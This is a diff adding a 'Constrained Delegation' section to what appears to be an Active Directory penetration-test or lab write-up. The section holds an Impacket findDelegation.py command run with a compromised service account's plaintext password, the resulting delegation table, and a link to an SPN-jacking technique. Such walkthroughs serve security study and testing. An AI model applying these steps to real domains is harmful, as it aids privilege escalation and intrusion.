@@ -1159,3 +1159,20 @@ This user is now compromised
 
 # Domain Admin
 
+## Constrained Delegation
+```python
+findDelegation.py -user 'svc_it_admin' "novaforge.local"/"svc_it_admin":'Password123!'
+Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its affiliated companies 
+
+AccountName   AccountType  DelegationType                      DelegationRightsTo             SPN Exists 
+------------  -----------  ----------------------------------  -----------------------------  ----------
+svc_it_admin  Person       Constrained w/ Protocol Transition  CIFS/STORAGE.novaforge.local   No         
+svc_it_admin  Person       Constrained w/ Protocol Transition  CIFS/STORAGE                   No         
+svc_it_admin  Person       Constrained w/ Protocol Transition  HTTP/STORAGE.novaforge.local   Yes        
+svc_it_admin  Person       Constrained w/ Protocol Transition  HTTP/STORAGE                   Yes        
+svc_it_admin  Person       Constrained w/ Protocol Transition  WSMAN/STORAGE.novaforge.local  Yes        
+svc_it_admin  Person       Constrained w/ Protocol Transition  WSMAN/STORAGE                  Yes        
+```
+
+https://www.thehacker.recipes/ad/movement/kerberos/spn-jacking
+
